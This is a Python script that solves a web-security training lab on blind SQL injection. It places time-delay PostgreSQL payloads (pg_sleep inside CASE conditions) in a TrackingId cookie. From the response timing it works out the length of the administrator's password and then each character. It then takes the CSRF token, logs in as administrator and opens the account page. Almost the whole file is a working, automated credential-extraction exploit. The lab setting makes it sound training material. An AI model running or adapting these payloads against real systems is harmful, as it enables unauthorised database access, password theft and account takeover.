#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 24/9/2023
#
# Lab: Blind SQL injection with time delays and information retrieval
#
# Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
#           administrator's password based on time delays
#        2. Modify the payload to brute force the administrator's password
#        3. Fetch the login page
#        4. Extract the csrf token and session cookie
#        5. Login as the administrator
#        6. Fetch the administrator profile
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########################################
# Function to determine password length
#########################################
def determin_password_length(url):
    for length in range(1, 50):
        print(Fore.WHITE + "1. Checking if password length = " +
              Fore.YELLOW + str(length), flush=True, end='\r')
        
        # payload to determine password length
        payload = f"' || (SELECT CASE WHEN length((select password from users where username = 'administrator')) = {length} THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -"
        
        # set trackingId cookie
        cookies = {
            "TrackingId": payload
        }

        try:
            # fetch the page with the injected payload
            injection = requests.get(f"{url}/filter?category=Pets", cookies=cookies)

        except:
            print(Fore.RED + "[!] Failed to inject the payload to determine the password length through exception")
            continue

        # if the request take 5 or more than 5 seconds to succeeded
        if injection.elapsed.seconds >= 5:
            print(Fore.WHITE + "1. Checking if password length = " +
                    Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " +
                    Fore.GREEN + str(length) + Fore.WHITE + " ]")

            # return the correct length
            return length
        
        else:
            continue


#####################################
# Function to brute force password
#####################################
def brute_force_password(url, password_length):
    # list that will hold the correct chars
    correct_password = []

    for position in range(1, password_length+1):
        # iterate over possible chars
        for character in "0123456789abcdefghijklmnopqrstuvwxyz":
            print(Fore.WHITE + "\r2. Checking if char at position " +
                  Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
            
            # payload to brute force password
            payload = f"' || (SELECT CASE WHEN substring((select password from users where username = 'administrator'), {position}, 1) = '{character}' THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -"
            
            # set trackingId cookie
            cookies = {
                "TrackingId": payload
            }
            
            try:
                # fetch the page with the injected payload
                injection = requests.get(f"{url}/filter?category=Pets", cookies=cookies)
            
            except:
                print(Fore.RED + "[!] Failed to inject the payload while brute forcing administrator's password through exception")
                continue

            # if the request take 5 or more than 5 seconds to succeeded
            if injection.elapsed.seconds >= 5:
                # add the char to the list
                correct_password.append(character)

                print(Fore.WHITE + "\r2. Checking if char at position " +
                        Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " +
                        Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')
                
                break
            
            else:
                continue
    
    # convert the list of chars to a string and return it
    return "".join(correct_password)


#########
# Main
#########

# change this to your lab URL
url = "https://0a6e003603b361a881185c4700ca008a.web-security-academy.net"

print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")

# determine password length
password_length = determin_password_length(url)

# brute force password
admin_password = brute_force_password(url, password_length)

try:  
    # fetch the login page
    fetch_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1)

print(Fore.WHITE + "\n3. Fetching login page.. " + Fore.GREEN + "OK")

# get session cookie
session = fetch_login.cookies.get("session")

# Extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]

print(Fore.WHITE + "4. Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "username": "administrator",
    "password": admin_password,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:      
    # login in as the administrator
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)

except:
    print(Fore.RED + "[!] Failed to login as the administrator through exception")
    exit(1)
    
print(Fore.WHITE + "5. Logging in as the administrator.. " + Fore.GREEN + "OK")

# get session cookie
new_session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": new_session
}

try:  
    # fetch the administrator profile
    admin = requests.get(f"{url}/my-account", cookies=cookies)

except:
    print(Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
    exit(1)

print(Fore.WHITE + "6. Fetching the administrator profile.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


